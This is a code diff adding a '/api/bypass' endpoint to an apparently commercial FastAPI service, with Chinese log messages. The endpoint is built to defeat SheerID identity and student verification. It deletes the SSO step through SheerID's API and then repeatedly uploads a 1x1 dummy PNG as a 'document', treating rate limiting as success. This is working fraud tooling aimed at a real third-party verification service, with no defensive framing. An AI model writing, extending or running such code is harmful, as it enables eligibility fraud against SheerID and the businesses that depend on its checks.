@@ -1845,6 +1845,162 @@ async def verify_via_dualbot(request: DualBotVerifyRequest):
     }
 
 
+# ========== Bypass API Endpoints ==========
+
+class BypassRequest(BaseModel):
+    link: str  # Full verification URL
+
+
+@app.post("/api/bypass")
+async def bypass_link_endpoint(request: BypassRequest, authorization: Optional[str] = Header(None)):
+    """
+    Bypass a SheerID verification link by repeatedly uploading dummy documents.
+    Returns a Server-Sent Events stream with live logs.
+    """
+    from fastapi.responses import StreamingResponse
+    import httpx
+    import re
+    import base64
+
+    link = request.link.strip()
+    # Extract VID
+    match = re.search(r'verificationId=([a-zA-Z0-9-]+)', link)
+    if not match:
+        raise HTTPException(status_code=400, detail="无法从链接中提取 verificationId")
+    vid = match.group(1)
+
+    async def event_stream():
+        import time
+        base_url = "https://services.sheerid.com/rest/v2"
+
+        def log(msg, level="info"):
+            ts = time.strftime("%H:%M:%S")
+            return f"data: {json.dumps({'time': ts, 'level': level, 'message': msg})}\n\n"
+
+        yield log(f"开始处理 VID: {vid[:12]}...")
+
+        try:
+            async with httpx.AsyncClient(timeout=30) as client:
+                # Step 1: Check current status
+                yield log("检查链接状态...")
+                check = await client.get(f"{base_url}/verification/{vid}")
+                if check.status_code != 200:
+                    yield log(f"检查失败: HTTP {check.status_code}", "error")
+                    yield f"data: {json.dumps({'done': True, 'success': False})}\n\n"
+                    return
+
+                step = check.json().get("currentStep", "unknown")
+                yield log(f"当前状态: {step}")
+
+                # Step 2: Wait for pending to clear
+                if step == "pending":
+                    yield log("链接正在处理中 (pending)，等待完成...", "warn")
+                    for poll in range(40):  # 120s max
+                        await asyncio.sleep(3)
+                        check = await client.get(f"{base_url}/verification/{vid}")
+                        if check.status_code == 200:
+                            step = check.json().get("currentStep", "")
+                        else:
+                            step = f"error_{check.status_code}"
+
+                        if step != "pending":
+                            yield log(f"状态已变更: {step}")
+                            break
+                        if poll % 3 == 0:
+                            yield log(f"仍在等待 pending... ({(poll+1)*3}s)")
+                    else:
+                        yield log("等待超时 (120s)，尝试继续...", "warn")
+
+                # Step 3: Handle SSO / collectStudentPersonalInfo
+                if step in ("sso", "collectStudentPersonalInfo"):
+                    yield log(f"跳过 SSO 步骤...")
+                    await client.delete(f"{base_url}/verification/{vid}/step/sso")
+                    yield log("SSO 已跳过")
+
+                if step == "success":
+                    yield log("✅ 链接已经是成功状态，不需要 bypass", "success")
+                    yield f"data: {json.dumps({'done': True, 'success': True, 'step': 'success'})}\n\n"
+                    return
+
+                # Step 4: Loop bypass uploads
+                tiny_png = base64.b64decode(
+                    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
+                )
+                upload_count = 0
+                max_uploads = 10
+
+                for i in range(max_uploads):
+                    yield log(f"上传 Bypass 文件 ({i+1}/{max_uploads})...")
+                    
+                    # Check step first
+                    check = await client.get(f"{base_url}/verification/{vid}")
+                    if check.status_code == 429:
+                        yield log(f"✅ HTTP 429 - 已触发频率限制 (Good!)", "success")
+                        upload_count = i
+                        break
+                    
+                    if check.status_code != 200:
+                        yield log(f"检查失败: HTTP {check.status_code}", "error")
+                        break
+
+                    current = check.json().get("currentStep", "")
+                    if current == "success":
+                        yield log("✅ 链接已变为成功状态", "success")
+                        yield f"data: {json.dumps({'done': True, 'success': True, 'step': 'success'})}\n\n"
+                        return
+                    if current == "pending":
+                        yield log("等待 pending 处理...")
+                        await asyncio.sleep(3)
+                        continue
+
+                    # Request upload URL
+                    upload_body = {"files": [{"fileName": "bypass.png", "mimeType": "image/png", "fileSize": 68}]}
+                    upload_resp = await client.post(
+                        f"{base_url}/verification/{vid}/step/docUpload",
+                        json=upload_body
+                    )
+
+                    if upload_resp.status_code == 429:
+                        yield log(f"✅ HTTP 429 - 已触发频率限制 (上传请求)", "success")
+                        upload_count = i
+                        break
+
+                    if upload_resp.status_code != 200:
+                        yield log(f"上传请求失败: HTTP {upload_resp.status_code}", "error")
+                        break
+
+                    docs = upload_resp.json().get("documents", [])
+                    if not docs or not docs[0].get("uploadUrl"):
+                        yield log("无法获取上传 URL", "error")
+                        break
+
+                    # Upload dummy PNG
+                    s3_resp = await client.put(
+                        docs[0]["uploadUrl"],
+                        content=tiny_png,
+                        headers={"Content-Type": "image/png"}
+                    )
+                    if not (200 <= s3_resp.status_code < 300):
+                        yield log(f"S3 上传失败: HTTP {s3_resp.status_code}", "error")
+                        break
+
+                    # Complete upload
+                    complete = await client.post(f"{base_url}/verification/{vid}/step/completeDocUpload")
+                    yield log(f"✅ 第 {i+1} 次上传完成 (Complete: {complete.status_code})", "success")
+                    upload_count = i + 1
+
+                    await asyncio.sleep(2)
+
+                yield log(f"Bypass 完成! 共成功上传 {upload_count} 次", "success")
+                yield f"data: {json.dumps({'done': True, 'success': True, 'uploads': upload_count})}\n\n"
+
+        except Exception as e:
+            yield log(f"错误: {str(e)}", "error")
+            yield f"data: {json.dumps({'done': True, 'success': False, 'error': str(e)})}\n\n"
+
+    return StreamingResponse(event_stream(), media_type="text/event-stream")
+
+
 # ========== CDK API Endpoints ==========
 
 @app.post("/api/cdk/validate")
